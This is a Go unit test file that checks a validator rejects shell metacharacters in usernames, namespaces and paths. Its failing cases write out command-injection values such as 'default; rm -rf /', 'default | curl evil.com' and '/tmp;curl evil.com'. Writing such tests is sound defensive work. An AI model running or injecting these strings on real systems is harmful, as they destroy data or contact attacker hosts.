//
// Copyright (c) 2026 Red Hat, Inc.
// This program and the accompanying materials are made
// available under the terms of the Eclipse Public License 2.0
// which is available at https://www.eclipse.org/legal/epl-2.0/
//
// SPDX-License-Identifier: EPL-2.0
//
// Contributors:
//   Red Hat, Inc. - initial API and implementation
//

package validation

import (
	"strings"
	"testing"
)

func TestValidateNoShellMetacharacters(t *testing.T) {
	tests := []struct {
		name      string
		value     string
		fieldName string
		wantError bool
	}{
		// Valid inputs
		{
			name:      "empty string should pass",
			value:     "",
			fieldName: "test",
			wantError: false,
		},
		{
			name:      "simple alphanumeric",
			value:     "developer",
			fieldName: "username",
			wantError: false,
		},
		{
			name:      "alphanumeric with dash",
			value:     "my-namespace",
			fieldName: "namespace",
			wantError: false,
		},
		{
			name:      "path with slashes",
			value:     "/home/user/project",
			fieldName: "cwd",
			wantError: false,
		},
		{
			name:      "path with dots",
			value:     "/home/user/../project",
			fieldName: "cwd",
			wantError: false,
		},
		{
			name:      "alphanumeric with underscore",
			value:     "user_name",
			fieldName: "username",
			wantError: false,
		},

		// Command injection attempts - should all fail
		{
			name:      "command substitution with $()",
			value:     "user$(whoami)",
			fieldName: "username",
			wantError: true,
		},
		{
			name:      "command substitution with backticks",
			value:     "user`id`",
			fieldName: "username",
			wantError: true,
		},
		{
			name:      "command separator semicolon",
			value:     "default; rm -rf /",
			fieldName: "namespace",
			wantError: true,
		},
		{
			name:      "pipe operator",
			value:     "default | curl evil.com",
			fieldName: "namespace",
			wantError: true,
		},
		{
			name:      "background operator",
			value:     "default & curl evil.com",
			fieldName: "namespace",
			wantError: true,
		},
		{
			name:      "output redirection",
			value:     "default > /etc/passwd",
			fieldName: "namespace",
			wantError: true,
		},
		{
			name:      "input redirection",
			value:     "default < /etc/passwd",
			fieldName: "namespace",
			wantError: true,
		},
		{
			name:      "double quote",
			value:     "user\"test",
			fieldName: "username",
			wantError: true,
		},
		{
			name:      "backslash escape",
			value:     "user\\ntest",
			fieldName: "username",
			wantError: true,
		},
		{
			name:      "newline character",
			value:     "user\ntest",
			fieldName: "username",
			wantError: true,
		},
		{
			name:      "carriage return",
			value:     "user\rtest",
			fieldName: "username",
			wantError: true,
		},
		{
			name:      "dollar sign variable expansion",
			value:     "user$PATH",
			fieldName: "username",
			wantError: true,
		},
		{
			name:      "path with semicolon injection",
			value:     "/tmp;curl evil.com",
			fieldName: "cwd",
			wantError: true,
		},
		{
			name:      "path with command substitution",
			value:     "/tmp/$(whoami)",
			fieldName: "cwd",
			wantError: true,
		},
		{
			name:      "single quote",
			value:     "user'test",
			fieldName: "username",
			wantError: true,
		},
		{
			name:      "exclamation mark",
			value:     "user!test",
			fieldName: "username",
			wantError: true,
		},
		{
			name:      "asterisk glob",
			value:     "user*",
			fieldName: "username",
			wantError: true,
		},
		{
			name:      "question mark glob",
			value:     "user?",
			fieldName: "username",
			wantError: true,
		},
		{
			name:      "square brackets",
			value:     "user[0-9]",
			fieldName: "username",
			wantError: true,
		},
		{
			name:      "curly braces",
			value:     "user{a,b}",
			fieldName: "username",
			wantError: true,
		},
		{
			name:      "opening parenthesis",
			value:     "user(test",
			fieldName: "username",
			wantError: true,
		},
		{
			name:      "closing parenthesis",
			value:     "user)test",
			fieldName: "username",
			wantError: true,
		},
		{
			name:      "parentheses without dollar sign",
			value:     "user(whoami)",
			fieldName: "username",
			wantError: true,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := ValidateNoShellMetacharacters(tt.value, tt.fieldName)
			if tt.wantError && err == nil {
				t.Errorf("ValidateNoShellMetacharacters() expected error for %q, got nil", tt.value)
			}
			if !tt.wantError && err != nil {
				t.Errorf("ValidateNoShellMetacharacters() unexpected error for %q: %v", tt.value, err)
			}
		})
	}
}

func TestValidateNoShellMetacharacters_ErrorMessage(t *testing.T) {
	err := ValidateNoShellMetacharacters("user$(whoami)", "username")
	if err == nil {
		t.Fatal("Expected error, got nil")
	}

	expected := "username contains forbidden character"
	if !containsString(err.Error(), expected) {
		t.Errorf("Error message %q does not contain %q", err.Error(), expected)
	}
}

func containsString(s, substr string) bool {
	return strings.Contains(s, substr)
}
